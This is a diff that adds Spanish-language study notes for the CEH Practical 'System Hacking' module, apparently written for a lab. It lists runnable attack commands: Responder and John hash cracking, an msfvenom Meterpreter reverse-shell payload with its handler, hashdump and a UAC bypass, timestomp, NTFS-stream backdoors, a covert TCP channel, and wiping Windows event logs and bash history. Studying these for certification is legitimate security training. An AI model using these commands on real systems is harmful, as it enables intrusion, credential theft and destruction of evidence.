@@ -1,0 +1,137 @@
+CEH Practical Notes
+------------------------------------------
+Modulo 6 - System Hacking
+------------------------------------------
+
+- Footprinting: Recopilar información de código abierto de la organización
+
+- Escaneo: Recopilar información sobre puertos y servicios abiertos, sistemas operativos y cualquier falla de configuración.
+
+- Enumeración: Recopilar información sobre nombres NetBIOS, recursos de red compartidos, detalles de políticas y contraseñas, usuarios y grupos de usuarios, tablas de enrutamiento y configuraciones de auditoría y servicio.
+
+- Analisis de vulnerabilidades: Recopilar información sobre vulnerabilidades de red, errores de configuración de aplicaciones y servicios, aplicaciones instaladas en el sistema de destino.
+
+- Obtener acceso: use técnicas como descifrar contraseñas y explotar vulnerabilidades para obtener acceso al sistema de destino
+
+- Escalada de privilegios: aproveche las vulnerabilidades conocidas existentes en los sistemas operativos y las aplicaciones de software para escalar los privilegios
+
+- Mantenimiento del acceso: mantenga altos niveles de acceso para realizar actividades malintencionadas, como ejecutar aplicaciones malintencionadas y robar, ocultar o manipular archivos confidenciales del sistema.
+
+- Eliminación de registros: evite el reconocimiento por parte de usuarios legítimos del sistema y permanezca sin ser detectado borrando las entradas correspondientes a actividades maliciosas en los registros del sistema, evitando así la detección.
+
+*** NOTAS: Footprinting (Pasiva), Fingerprinting (Activa - Se recopilan los pasos: Escaneo, Enumeración, Analisis de vulnerabilidades) ***
+
+1 - Gain access to the system
+
+	1.1 - Perform active online attack to crack the system’s password using Responder
+		># responder.py -I eth0
+
+		# Desde Windows, acceder al recurso con la IP de la máquina atacante.
+		># john hashes
+		># john --wordlist=/path/to/wordlist hashes
+
+	1.2 - Audit system passwords using L0phtCrack
+
+	1.3 - Find vulnerabilities on exploit sites
+
+	1.4 - Exploit client-side vulnerabilities and establish a VNC session
+
+	1.5 - Gain access to a remote system using Armitage
+
+	1.6 - Hack a Windows machines with a malicious Office document using TheFatRat
+		# RatFat nos permite introducir backdoors en archivos de Office.
+		># fatrat
+
+	1.7 - Perform buffer overflow attack to gain access to a remote system
+
+2 - Perform privilege escalation to gain higher privileges#
+
+	2.1 - Escalate privileges using privilege escalation tools and exploit client-side vulnerabilities
+		># msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -e x86/shikata_ga_nai -b "\x00" LHOST=10.10.10.13 -f exe > Desktop/Exploit.exe
+		># msfconsole
+		># use exploit/multi/handler
+		># set payload windows/meterpreter/reverse_tcp
+		># set LHOST 10.10.10.13
+		># exploit -j -z
+		># upload beRoot.exe (Con sessión de meterpreter iniciada)
+
+		# Útiles MetaSploit
+		># run post/windows/gather/smart_hashdump (Dump de los hashes, se requiere privilegios)
+		># getsystem
+		># use exploit/windows/local/bypassuac_fodhelper
+			># set SESSION 1
+
+	2.2 - Hack a Windows machine using Metasploit and perform post-exploitation using Meterpreter
+		
+		# Mientras realiza actividades posteriores a la explotación, un atacante intenta acceder a los archivos para leer su contenido. Al hacerlo, los atributos MACE (modificado, accedido, creado, entrada) cambian inmediatamente, lo que indica al usuario o propietario del archivo que alguien ha leído o modificado la información.
+
+		# Para no dejar rastro de estos atributos MACE, use el comando timestomp para cambiar los atributos como desee después de acceder a un archivo.
+
+		>#  timestomp -v secret.txt
+		>#  timestomp secret.txt -m “02/11/2018 08:10:03”
+
+3 - Maintain remote access and hide malicious activities
+
+	3.1 - User system monitoring and surveillance using Power Spy
+
+	3.2 - User system monitoring and surveillance using Spytech SpyAgent
+
+	3.3 - Hide files using NTFS streams
+		># type c:\magic\calc.exe > c:\magic\readme.txt:calc.exe
+
+		# Para abrir ejecutable en ADS:
+			># mklink backdoor.exe readme.txt:calc.exe
+			># backdoor.exe
+
+		# Para visualizar txt en ADS:
+			># more < readme.txt:secret.txt
+
+	3.4 - Hide data using white space steganography
+		#>  snow -C -m "My swiss bank account number is 45656684512263" -p "magic" readme.txt readme2.txt
+		#> snow -C -p "magic" readme2.txt (Visualizar contenido oculto)
+
+		# Podemos visualizar el contenido a través de linux
+		># stegsnow -C -p "magic" readme2.txt
+
+	3.5 - Image steganography using OpenStego
+
+	3.6 - Covert channels using Covert_TCP
+		># gcc -o covert_tcp covert_tcp.c
+		># ./covert_tcp -dest 10.10.10.9 -source 10.10.10.13 -source_port 9999 -dest_port 8888 -server -file /home/ubuntu/Desktop/Receive/receive.txt
+		># ./covert_tcp -dest 10.10.10.9 -source 10.10.10.13 -source_port 8888 -dest_port 9999 -file /home/attacker/Desktop/Send/message.txt
+
+4 - Clear logs to hide the evidence of compromise
+
+	4.1 - View, enable, and clear audit policies using Auditpol
+		># auditpol /get /category:* (Muestra todas las políticas de auditoría)
+		># auditpol /set /category:"system","account logon" /success:enable /failure:enable
+		># auditpol /clear /y
+
+	4.2 - Clear Windows machine logs using various utilities
+
+		# Borrar registros de auditoría con CMD o BAT file.
+		# https://www.tenforums.com/tutorials/16588-clear-all-event-logs-event-viewer-windows.html
+
+		>#  for /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"
+
+		# Elmina completamente archivos eliminados para que no puedan ser recuperados con técnicas forenses:
+		># cipher /w:C: (Borra permanentemente archivos eliminados en unidad C:)
+
+		NOTAS:
+
+		Cipher.exe es una herramienta de línea de comandos de Windows incorporada que se puede utilizar para eliminar de forma segura un fragmento de datos sobrescribiéndolos para evitar su posible recuperación. Este comando también ayuda a cifrar y descifrar datos en particiones NTFS.
+
+		Cuando un atacante crea un archivo de texto malicioso y lo cifra, en el momento del proceso de cifrado, se crea un archivo de copia de seguridad. Por lo tanto, en los casos en los que se interrumpe el proceso de cifrado, el archivo de copia de seguridad se puede utilizar para recuperar los datos. Una vez finalizado el proceso de cifrado, se elimina el archivo de copia de seguridad, pero este archivo eliminado se puede recuperar utilizando un software de recuperación de datos y el personal de seguridad puede utilizarlo más para la investigación. Para evitar la recuperación de datos y cubrir sus huellas, los atacantes usan la herramienta Cipher.exe para sobrescribir los archivos eliminados.
+
+	4.3 - Clear Linux machine logs using the BASH shell
+		># export HISTSIZE=0 (Determina el número de comandos que se guardarán en bash_history, se establece en 0 para que no almacene comandos)
+		># history -c (Borra el historial almacenado)
+		o
+		># history -w (Borra el historial de shell actual sin afectar a otras shells)
+
+		># shred .bash_history (Destruye el archivo para que sea ilegible)
+
+		# Comando one-line para borrar huellas en Bash
+		># shred ~/.bash_history && cat /dev/null > .bash_history && history -c && exit
+
+	4.4 - Clear Windows machine logs using CCleaner
